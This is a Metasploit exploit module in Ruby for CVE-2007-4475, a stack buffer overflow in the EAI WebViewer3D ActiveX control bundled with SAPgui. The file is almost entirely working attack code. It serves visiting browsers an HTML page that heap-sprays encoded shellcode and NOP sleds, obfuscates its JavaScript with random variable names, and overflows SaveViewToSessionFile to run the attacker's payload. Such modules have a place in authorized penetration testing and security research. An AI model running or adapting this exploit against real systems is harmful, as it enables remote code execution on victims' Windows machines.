##
# $Id: sapgui_saveviewtosessionfile.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'SAP AG SAPgui EAI WebViewer3D Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Siemens Unigraphics Solutions
				Teamcenter Visualization EAI WebViewer3D ActiveX control that is bundled
				with SAPgui. When passing an overly long string the SaveViewToSessionFile()
				method, arbitrary code may be executed.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2007-4475' ],
					[ 'OSVDB', '53066' ],
					[ 'US-CERT-VU','985449' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => '' } ]
				],
			'DisclosureDate' => 'Mar 31 2009',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload.
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Create some nops.
		nops    = Rex::Text.to_unescape(make_nops(4))

		# Set the return.
		ret = Rex::Text.uri_encode(Metasm::Shellcode.assemble(Metasm::Ia32.new, "or cl,[edx]").encode_string * 2)

		# Randomize the javascript variable names.
		vname  = rand_text_alpha(rand(100) + 1)
		var_i  = rand_text_alpha(rand(30)  + 2)
		rand1  = rand_text_alpha(rand(100) + 1)
		rand2  = rand_text_alpha(rand(100) + 1)
		rand3  = rand_text_alpha(rand(100) + 1)
		rand4  = rand_text_alpha(rand(100) + 1)
		rand5  = rand_text_alpha(rand(100) + 1)
		rand6  = rand_text_alpha(rand(100) + 1)
		rand7  = rand_text_alpha(rand(100) + 1)
		rand8  = rand_text_alpha(rand(100) + 1)

		content = %Q|
		<html>
			<object id='#{vname}' classid='clsid:AFBBE070-7340-11D2-AA6B-00E02924C34E'></object>
			<script language="JavaScript">
				var #{rand1} = unescape('#{shellcode}');
				var #{rand2} = unescape('#{nops}');
				var #{rand3} = 20;
				var #{rand4} = #{rand3} + #{rand1}.length;
				while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};
				var #{rand5} = #{rand2}.substring(0,#{rand4});
				var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});
				while (#{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5};
				var #{rand7} = new Array();
				for (#{var_i} = 0; #{var_i} < 400; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} }
				var #{rand8} = "";
				for (#{var_i} = 0; #{var_i} < 12500; #{var_i}++) { #{rand8} = #{rand8} + unescape('#{ret}') }
				#{vname}.SaveViewToSessionFile(#{rand8});
			</script>
		</html>
			|

		content = Rex::Text.randomize_space(content)

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
